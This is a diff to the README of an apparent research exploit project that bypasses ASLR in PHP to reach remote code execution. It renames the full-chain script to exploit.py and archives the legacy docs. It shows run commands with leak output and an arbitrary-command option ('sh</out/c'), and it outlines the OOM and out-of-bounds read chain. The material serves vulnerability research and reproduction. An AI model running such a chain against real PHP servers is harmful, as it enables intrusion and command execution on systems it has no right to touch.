@@ -39,7 +39,7 @@ cd php2shell-bypass-aslr-exp
 # memory_limit => 128M => 128M
 
 # 2) One command: A1 -> B1 leak -> A2 -> B2 -> id
-python3 pure/pwn_pure.py --port 18110
+python3 exploit.py --port 18110
 # [try 1] A1: END-cleanup send_cookie OOM
 # [try 1] B1: stale-id OOB read (chunk base + libphp)
 #       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
@@ -62,11 +62,11 @@ Common options:
 
 ```bash
 # Re-test with fresh ASLR (restart the container)
-python3 pure/pwn_pure.py --port 18110 --restart p2s-pure-18110
+python3 exploit.py --port 18110 --restart p2s-pure-18110
 
 # Arbitrary command: write a script into the mounted directory, then run sh
 printf 'id; uname -a > /out/p1\n' > out/c
-python3 pure/pwn_pure.py --port 18110 --cmd 'sh</out/c'
+python3 exploit.py --port 18110 --cmd 'sh</out/c'
 ```
 
 `--retries` defaults to 3. If the most common pointer in an OOB window is
@@ -117,7 +117,7 @@ chain derive it at runtime.
 ## Evidence
 
 - Mechanism and calibration: [pure/RESEARCH_PURE_128M.md](pure/RESEARCH_PURE_128M.md)
-- Full-chain script: [pure/pwn_pure.py](pure/pwn_pure.py)
+- Full-chain script: [exploit.py](exploit.py) (`pure/pwn_pure.py` remains as an alias)
 - Debug-image batch log: [pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
 - Official-image log: [pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
 - Proof: [pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
@@ -126,10 +126,12 @@ chain derive it at runtime.
 
 The early `exploit.py` used a **custom** `docker/php.ini`
 (`display_errors=On`, `memory_limit=8M`, `max_input_vars=1000`). It is
-unrelated to the official-config target above and is kept only as a
-historical/mechanism reference; [HTTP_HEAP_LEAK.md](HTTP_HEAP_LEAK.md),
-[ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md), and
-[DISPLAY_ERRORS_OFF.md](DISPLAY_ERRORS_OFF.md) describe that line.
+unrelated to the official-config target above and is archived at
+[archive/legacy-8m/exploit.py](archive/legacy-8m/exploit.py); the docs in
+the same directory, such as
+[HTTP_HEAP_LEAK.md](archive/legacy-8m/HTTP_HEAP_LEAK.md) and
+[ASLR_PURE_HTTP.md](archive/legacy-8m/ASLR_PURE_HTTP.md), describe that
+line.
 
 ## Reproduction statement
 
